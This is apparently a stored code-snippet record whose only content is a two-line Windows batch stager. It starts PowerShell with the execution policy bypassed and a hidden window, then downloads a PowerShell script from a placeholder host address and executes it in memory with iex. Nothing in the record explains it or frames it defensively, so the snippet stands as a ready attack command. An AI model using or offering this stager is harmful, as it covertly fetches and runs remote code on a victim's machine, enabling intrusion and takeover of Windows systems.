---
id: ec637bee-c110-48d2-a410-da6a1be35d0b
type: code
language: ''
verified: false
created_at: '2020-03-13T01:41:08.087866+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet ec637bee

```
@ECHO OFF
powershell.exe -ep bypass -windowstyle hidden "iex(New-Object Net.WebClient).downloadString('http://$_TARGET_IP/$_SCRIPT.ps1')"
```
